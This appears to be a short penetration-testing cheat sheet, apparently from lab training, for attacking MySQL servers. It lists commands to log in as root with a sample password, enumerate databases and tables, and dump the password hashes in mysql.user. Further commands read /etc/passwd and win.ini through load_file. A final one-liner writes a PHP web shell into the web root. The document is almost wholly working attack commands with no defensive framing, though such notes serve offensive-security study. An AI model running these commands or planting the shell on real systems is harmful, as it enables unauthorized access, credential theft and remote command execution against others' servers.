Interaction with mySql server
```
mysql -u root -h 10.129.14.132
eg.
mysql -u root -pP4SSw0rd -h 10.129.14.128

SHOW DATABASES; -- List all databases 
USE <database_name>; -- Switch context to a database \
SHOW TABLES; -- List tables in the active database 
SELECT user, host, authentication_string FROM mysql.user; -- Dump user credentials/hashes -- Check current user privileges (Crucial for assessing file read/write rights) 
SELECT user(), current_user(); 
SELECT * FROM mysql.user WHERE user='root'\G

```


High-Priority System Schemas (The Target Trails)
```
SELECT schema_name FROM information_schema.schemata; -- Enumerate all database names
SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='<target_db>';
SELECT column_name FROM information_schema.columns WHERE table_name='<target_table>';
```

File Reading (LFI alternative)
```
SELECT load_file('/etc/passwd'); 
SELECT load_file('C:\\Windows\\win.ini');
```

Web Shell Placement / Arbitrary File Write
```
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

